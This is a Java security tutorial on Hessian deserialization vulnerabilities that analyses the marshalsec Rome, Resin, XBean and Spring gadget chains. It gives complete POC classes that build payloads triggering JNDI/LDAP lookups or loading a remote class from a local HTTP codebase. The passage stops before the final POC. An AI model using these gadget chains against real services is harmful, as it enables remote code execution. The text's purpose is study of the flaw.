# Java Security Learning—Hessian Deserialization Vulnerability

Author: H3rmesk1t

Data: 2022.03.11

# Preface
This article first learns the `Hessian` deserialization vulnerability, and provides pre-knowledge for subsequent learning of `Dubbo`-related deserialization vulnerabilities.

# Serialization/deserialization mechanism
Here we add that in `Java`, the serialization/deserialization mechanism is roughly divided into the following two types, refer to [marshalsec.pdf](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true).

## Bean attribute access mechanism
 - SnakeYAML
 - jYAML
 - YamlBeans
 - Apache Flex BlazeDS
 - Red5 IO AMF
 - Jackson
 - Castor
 - Java XMLDecoder
 - ...

They have common points and also have their own unique different processing methods. The most basic difference is how to set property values ​​on objects. Some automatically call `getter(xxx)` and `setter(xxx)` through reflection; some also need to call the default `Constructor`; some processors deserialize objects, if some methods of the class object still meet certain requirements set by themselves, they will also be called automatically; there are also `XMLDecoder`, a processor that can call any method of the object; some processors support polymorphic characteristics, for example, a certain attribute of an object is of type `Object`, `Interface`, `abstruct`, etc. In order to fully recover during deserialization, specific type information needs to be written. At this time, more classes can be specified, and some methods of specific class objects will also be automatically called to set the property values ​​of these objects during deserialization. This mechanism has a larger attack surface than that based on the Field mechanism, because they call more methods automatically and automatically call them when supporting polymorphic features than those based on the Field mechanism.

## Based on Field mechanism
 - Java Serialization
 - Kryo
 - Hessian
 - json-io
 - XStream
 - ...

Based on the `Field` mechanism, it is implemented through special `native` (`native` method is not `java` code, so it will not call `getter`, `setter` and more `java` methods, such as `Bean` mechanism, or reflection (in the end, the `native` method is used) to directly assign `Field`. It is not to assign attributes through `getter` and `setter` methods. Some of the above processors can also support the `Bean` mechanism if they have special specifications or configurations.

# Hessian Introduction
`Hessian` is a binary web service` protocol. It officially implements multiple languages ​​such as `Java`, `Flash`/`Flex`, `Python`, `C++`, `.NET C#`. It is a lightweight `RPC` framework that provides the function of `RMI` using a simple method. `Hessian` is transmitted based on the `HTTP` protocol and uses the binary `RPC` protocol, which is suitable for sending binary data and is more friendly to situations where data packets are larger.

## Difference Test
Here is a simple test of `Hessian Serialization` and `Java Serialization`:

 - Demo.java

```java
package org.h3rmesk1t.Hessian;

import java.io.Serializable;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 11:39 am
 */
public class Demo implements Serializable {

    private int age;
    private String name;


    public int getAge() {
        System.out.println("getAge call");
        return age;
    }

    public void setAge(int age) {
        System.out.println("setAge call");
        this.age = age;
    }

    public String getName() {
        System.out.println("getName call");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName call");
        this.name = name;
    }

    public Demo() {
        System.out.println("Demo default contractor call");
    }

    public Demo(int age, String name) {
        this.age = age;
        this.name = name;
    }

    @Override
    public String toString() {
        return "My name is " + name + " and my age is " + age;
    }
}
```

 - HJSerialization.java

```java
package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 11:38 am
 */
public class HJessianSerialization {

    public static <T> byte[] hserialize(T t) {
        byte[] data = null;
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
            hessianOutput.writeObject(t);
            data = byteArrayOutputStream.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return data;
    }

    public static <T> T hdeserialize(byte[] date) {
        if (date == null) {
            return null;
        }
        Object obj = null;
        try {
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(date);
            HessianInput hessianInput = new HessianInput(byteArrayInputStream);
            obj = hessianInput.readObject();
            hessianInput.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return (T) obj;
    }

    public static <T> byte[] jdkserialize(T t) {
        byte[] data = null;
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            obje
ctOutputStream.writeObject(t);
            objectOutputStream.close();
            data = byteArrayOutputStream.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return data;
    }

    public static <T> T jdkdeserialize(byte[] date) {
        if (date == null) {
            return null;
        }
        Object obj = null;
        try {
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(date);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            obj = objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return (T) obj;
    }

    public static void main(String[] args) throws Exception {
        Demo demo = new Demo(20, "h3rmesk1t");

        long htime1 = System.currentTimeMillis();
        byte[] hdata = hserialize(demo);
        long htime2 = System.currentTimeMillis();
        System.out.println("hessian serialize result length = " + hdata.length + "," + "cost time:" + (htime2 - htime1));

        long htime3 = System.currentTimeMillis();
        Demo hdemo = hdeserialize(hdata);
        long htime4 = System.currentTimeMillis();
        System.out.println("hessian deserialize result: " + hdemo + "," + "cost time:" + (htime4 - htime3) + "\n");

        long jdktime1 = System.currentTimeMillis();
        byte[] jdkdata = hserialize(demo);
        long jdktime2 = System.currentTimeMillis();
        System.out.println("jdk serialize result length = " + jdkdata.length + "," + "cost time:" + (jdktime2 - jdktime1));

        long jdktime3 = System.currentTimeMillis();
        Demo jdkdemo = hdeserialize(jdkdata);
        long jdktime4 = System.currentTimeMillis();
        System.out.println("jdk deserialize result: " + jdkdemo + "," + "cost time:" + (jdktime4 - jdktime3) + "\n");

    }
}
```

<div align=center><img src="./images/1.png"></div>

## Hessian concept diagram
The basic concept diagram of the `Hessian` serialization/deserialization mechanism is as follows:

<div align=center><img src="./images/2.png"></div>

 - AbstractSerializerFactory: Abstract Serializer Factory, a factory that manages and maintains corresponding serialization/deserialization mechanisms. It has the getSerializer and getDeserializer methods. The default implementations are as follows.
   - SerializerFactory: Standard implementation.
   - ExtSerializerFactory: You can set a custom serialization mechanism, which can be extended through this Factory.
   - BeanSerializerFactory: Force-specifies the serialization mechanism of the default Object of SerializerFactory, specified as BeanSerializer.
   - Serializer: Serialized interface, with writeObject method.
   - Deserializer: Deserialized interface, with readObject, resdMap, and readList methods.
   - AbstractHessianInput: Hessian Custom input stream, providing corresponding read various types of methods.
   - AbstractHessianOutput: Hessian Custom output stream, providing corresponding write various types of methods.

`Hessian Serializer`/`Hessian Derializer` implements the following serialization/deserializer by default. Users can also customize the serialization/deserializer through interfaces/abstract classes:

<div align=center><img src="./images/3.png"></div>

In the Deserializer of Hessian, there are the following deserializers that are implemented by default:

<div align=center><img src="./images/4.png"></div>

# Hessian deserialization vulnerability
Compared with the native serialization of `Java`, `Hessian` is more efficient and very suitable for binary data transmission. Since it is a serialization/deserialization framework, `Hessian` also has the problem of deserialization vulnerability.

For exploitation of the Hessian deserialization vulnerability, you can use the Gadget of the [marshalsec](https://github.com/mbechler/marshalsec) tool instead of the Gadget of the ysoserial. This is because ysoserial is targeting the Java native deserialization vulnerability, and there are no Gadgets of non-Java native deserialization vulnerabilities such as Hessian.

There is also a vulnerability in the deserialization of the `Map` type entry point will call the `put` method of `HashMap`, in other words, it will call the `key`hashcode` method, so as long as you find a utilization chain starting with `hashcode`, you can complete a `Hessian` deserialization attack. In the `marshalsec` tool, there are already `5 available `Gadgets`, namely:
 - Rome
 - XBean
 - Resin
 - SpringPartiallyComparableAdvisorHolder
 - SpringAbstractBeanFactoryPointcutAdvisor

<div align=center><img src="./images/5.png"></div>

## Rome
### Construct Analysis
 - Let's first look at the `Rome.java` given in `marshalsec`, follow up in the `JDKUtil.makeJNDIRowSet(args[ 0 ])` statement, `args[ 0 ]` is the `ldap` address passed in.
```java
public interface Rome extends Gadget {

    @Primary
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    default Object makeRome ( UtilFactory uf, String[] args ) throws Exception {
        return makeROMEAllPropertyTrigger(uf, JdbcRowSetImpl.class, JD
KUtil.makeJNDIRowSet(args[ 0 ]));
    }
    ...
}
```

 - In `makeJNDIRowSet`, first create the `JdbcRowSetImpl` instance, then call the `setDataSourceName` method to assign the `dataSource` of the instance to the input `jndiUrl` variable, then call the `setMatchColumn` method, set the `strMatchColumn` member variable of the `JdbcRowSetImpl` instance to `foo`, and finally set the `listeners` variable of the `JdbcRowSetImpl` instance to `null`.

```java
public static JdbcRowSetImpl makeJNDIRowSet ( String jndiUrl ) throws Exception {
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    rs.setDataSourceName(jndiUrl);
    rs.setMatchColumn("foo");
    Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
    return rs;
}
```

 - Then follow up on the `Rome#makeROMEAllPropertyTrigger` method in `marshalsec`, instantiate the `ToStringBean` object, pass the `JdbcRowSetImpl.class` and `JdbcRowSetImpl` instances into the constructor, then instantiate the `EqualsBean` object and pass the `ToStringBean.class` and `ToStringBean` instantiate it, and get the instantiated object named `root`. Then call `uf.makeHashCodeTrigger(root)`.

```java
default <T> Object makeROMEAllPropertyTrigger ( UtilFactory uf, Class<T> type, T obj ) throws Exception {
    ToStringBean item = new ToStringBean(type, obj);
    EqualsBean root = new EqualsBean(ToStringBean.class, item);
    return uf.makeHashCodeTrigger(root);
}
```

 - Then follow up to the `UtilFactory#makeHashCodeTrigger` method, which will pass `2` same objects into the `JDKUtil#makeMap` method.

```java
default Object makeHashCodeTrigger (Object o1 ) throws Exception {
    return JDKUtil.makeMap(o1, o1);
}
```

 - Follow up on the `JDKUtil#makeMap` method, first instantiate `HashMap` and set the length to `2`, then reflect to obtain `java.util.HashMap$Node` or `java.util.HashMap$Entry`, then instantiate an object and set length to `2`, and the first data inserts an instantiated object with a value of `java.util.HashMap$Node`, which passes `4` values ​​when instantiating the object, the first value is `0`, the second and third values ​​are the `EqualsBean` instantiated object that was just obtained and passed in, and the fourth is `null`. The second data inserted is the same as the first one, Then set the `s`table` value in the `hashmap` by reflection is the `java.util.HashMap$Node` object created by reflection.

```java
public static HashMap<Object, Object> makeMap (Object v1, Object v2) throws Exception {
    HashMap<Object, Object> s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);

    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);
    return s;
}
```

### POC
```java
package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 5:07 pm
 */
public class RomeGadget {

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object JDBCInject() throws Exception {

        // When deserializing, ToStringBean.toString will be called, triggering JdbcRowSetImpl.getDatabaseMetaData ->
JdbcRowSetImpl.connect -> Context.lookup.
        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiUrl);
        jdbcRowSet.setMatchColumn("foo");
        return jdbcRowSet;
    }

    public static void main(String[] args ) throws Exception {

        // EqualsBean.beanHashCode will be called during deserialization, triggering ToStringBean.toString.
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, JDBCInject());

        // HashMap.hash will be called during deserialization, triggering EqualsBean.hashCode -> EqualsBean.beanHashCode.
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        // HashMap.put -> HashMap.putVal -> HashMap.hash
        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, equalsBean, equalsBean, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, equalsBean, equalsBean, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian serializes data
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian serialized data is: " + new String(serializedData, 0, serializedData.length));

        // Hessian deserializes data
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```

<div align=center><img src="./images/6.png"></div>

## Resin
### Construct Analysis
 - Let's first look at the `Resin.java` given in `marshalsec`, first reflect the call `javax.naming.spi.ContinuationDirContext`, then instantiate the object, pass in `CannotProceedException` and `Hashtable` respectively. Then create a `CannotProceedException` object, set its `cause` and `stackTrace` null`. Then create a `Reference` object and get a remote malicious class. Finally, call the `UtilFactory#makeToStringTriggerStable` method.

```java
public interface Resin extends Gadget {

    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception {

        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "cause", null);
        Reflections.setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ]));

        Reflections.setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");
        return uf.makeToStringTriggerStable(qName);
    }
}
```

 - Follow up on the `UtilFactory#makeToStringTriggerStable` method, continue to call the `ToStringUtil#makeToStringTrigger` method. First call the `unhash` method to calculate `qName.hashCode`, then create an `XString` object, and finally call the `JDKUtil#makeMap` method, the same as the analysis after `RomeGadget`.

```java
default Object makeToStringTriggerStable (Object obj ) throws Exception {
    return ToStringUtil.makeToStringTrigger(obj);
}
```

```java
public static Object makeToStringTrigger (Object o ) throws Exception {
    String unhash = unhash(o.hashCode())
;
    XString xString = new XString(unhash);
    return JDKUtil.makeMap(o, xString);
}
```

### POC

```java
package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.*;
import com.sun.org.apache.xpath.internal.objects.XString;
import sun.reflect.ReflectionFactory;
import com.caucho.naming.QName;
import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Hashtable;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 12:40 am
 */
public class ResinGadget {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }

    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }

    public static void main(String[] args) throws Exception {

        String remoteUrl = "http://127.0.0.1:8180/";
        String remoteClass = "ExecTemplateJDK8";
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        setFieldValue(cpe, "cause", null);
        setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(new Reference("Foo", remoteClass, remoteUrl));

        setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");

        String unhash = unhash(qName.hashCode());
        XString xString = new XString(unhash);

        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(
true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, qName, qName, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, xString, xString, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian serializes data
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian serialized data is: " + new String(serializedData, 0, serializedData.length));

        // Hessian deserializes data
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```

<div align=center><img src="./images/8.png"></div>

## XBean
### Construct Analysis
 - Like `ResinGadget`, first create a `ReadOnlyBinding` object to bind the remote malicious class, and then call the `MarshallerBase#makeToStringTriggerUnstable` method.

```java
public interface XBean extends Gadget {

    @Args ( minArgs = 2, args = {
        "codebase", "classname"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    default Object makeXBean ( UtilFactory uf, String[] args ) throws Exception {
        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("foo", args[ 1 ], args[ 0 ]);
        ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
        return uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
    }

}
```

 - Follow up on the `MarshallerBase#makeToStringTriggerUnstable` method, and further call the `ToStringUtil#makeSpringAOPToStringTrigger` method. Here, `HotSwappableTargetSource` will be called to create two objects, and finally `JDKUtil#makeMap` method is the same as the analysis after `RomeGadget`.

```java
@Override
public Object makeToStringTriggerUnstable ( Object obj ) throws Exception {
    return ToStringUtil.makeSpringAOPToStringTrigger(obj);
}
```

```java
public static Object makeSpringAOPToStringTrigger (Object o ) throws Exception {
    return makeToStringTrigger(o, x -> {
        return new HotSwappableTargetSource(x);
    });
}
```

```java
public static Object makeToStringTrigger ( Object o, Function<Object, Object> wrap ) throws Exception {
    String unhash = unhash(o.hashCode());
    XString xString = new XString(unhash);
    return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
}
```

### POC

```java
package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;

import javax.naming.Context;
import javax.naming.Reference;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 1:06 am
 */
public class XBeanGadget {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if
( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    @SuppressWarnings ( {
            "unchecked"
    } )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static void main(String[] args) throws Exception {

        String remoteUrl = "http://127.0.0.1:8180/";
        String remoteClass = "ExecTemplateJDK8";

        Context ctx = createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("foo", remoteClass, remoteUrl);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);

        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(binding);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("h3rmesk1t"));


        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, hotSwappableTargetSource1, hotSwappableTargetSource1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hotSwappableTargetSource2, hotSwappableTargetSource2, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian serializes data
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian serialized data is: " + new String(serializedData, 0, serializedData.length));

        // Hessian deserializes data
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```

<div align=center><img src="./images/9.png"></div>


## SpringPartiallyComparableAdvisorHolder
### Construct Analysis
 - Let's first look at the SpringPartiallyComparableAdvisorHolder.java` given in `marshalsec`, here you will pass the incoming `jndiUrl` into the SpringUtil#makeJNDITrigger` method.

```java
public interface SpringPartiallyComparableAdvisorHolder extends G
adget {

    @Primary
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    default Object makesPartiallyComparableAdvisorHolder ( UtilFactory uf, String[] args ) throws Exception {
        String jndiUrl = args[ 0 ];
        BeanFactory bf = SpringUtil.makeJNDITrigger(jndiUrl);
        return SpringUtil.makeBeanFactoryTriggerPCAH(uf, jndiUrl, bf);
    }
}
```

 - Follow up on the `SpringUtil#makeJNDITrigger` method, and continue to call the `SimpleJndiBeanFactory#setShareableResources` method, which converts `jndiUrl` into a `list` object, and then calls the `this.shareableResources.addAll` method to perform an `addAll` operation on the `shareableResources` HashSet`. Then get `bf`, set the value of `logger` to `NoOpLog` instantiation object, and operate on the obtained `bf.getJndiTemplate()` in the same way. Finally, return the `BeanFactory` instantiation object.

```java
public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
    SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
    bf.setShareableResources(jndiUrl);
    Reflections.setFieldValue(bf, "logger", new NoOpLog());
    Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    return bf;
}
```

```java
public void setShareableResources(String... shareableResources) {
    this.shareableResources.addAll(Arrays.asList(shareableResources));
}
```

 - Continue to follow up on the `SpringPartiallyComparableAdvisorHolder#makeBeanFactoryTriggerPCAH` method, first create the instantiated object of `BeanFactoryAspectInstanceFactory`, and reflect the `bf` variable and `name` to be`beanFactory` and `name` respectively. Then create the `AbstractAspectJAdvice` object, set the value of `aspectInstanceFactory` to `aif` variable object for passing. And set the `declaringClass`, `methodName`, and `parameterTypes` of `advice` to `Object.class`, `toString`, and `new Class[0]`, create the `AspectJPointcutAdvisor` object, place the `advice` with a series of values ​​set in the `advice` variable of the `advice` object. Finally, create the `org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder` object, set the `advice` to the `advice` member variable of the `advice` object, and call `uf.makeToStringTriggerUnstable(pcah)`.

```java
public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, BeanFactory bf ) throws ClassNotFoundException,
        NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
    AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
    Reflections.setFieldValue(aif, "beanFactory", bf);
    Reflections.setFieldValue(aif, "name", name);
    AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
    Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);

    // make readObject happy if it is called
    Reflections.setFieldValue(advice, "declaringClass", Object.class);
    Reflections.setFieldValue(advice, "methodName", "toString");
    Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);

    AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
    Reflections.setFieldValue(advisor, "advice", advice);

    Class<?> pcahCl = Class
            .forName("org.springframework.aop.aspectj.autopproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
    Object pcah = Reflections.createWithoutConstructor(pcahCl);
    Reflections.setFieldValue(pcah, "advisor", advisor);
    return uf.makeToStringTriggerUnstable(pcah);
}
```

 - Then follow up on `UtilFactory#makeToStringTriggerUnstable`, and continue to call the `ToStringUtil#makeToStringTrigger` method. Then call the `JDKUtil#makeMap` method, which is the same as the analysis after `RomeGadget`.

```java
Object makeToStringTriggerUnstable ( Object obj ) throws Exception;


default Object makeToStringTriggerStable (Object obj ) throws Exception {
    return ToStringUtil.makeToStringTrigger(obj);
}
```

```java
public static Object makeToStringTrigger ( Object o, Function<Object, Object> wrap ) throws Exception {
    String unhash = unhash(o.hashCode());
    XString xString = new XString(unhash);
    return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
}
```

### POC
There are a few lines of code in the serialization part in `POC`, because generally, for object serialization, if the corresponding `class` of the object does not implement `java.io.Serializable`, there is no way to serialize it.
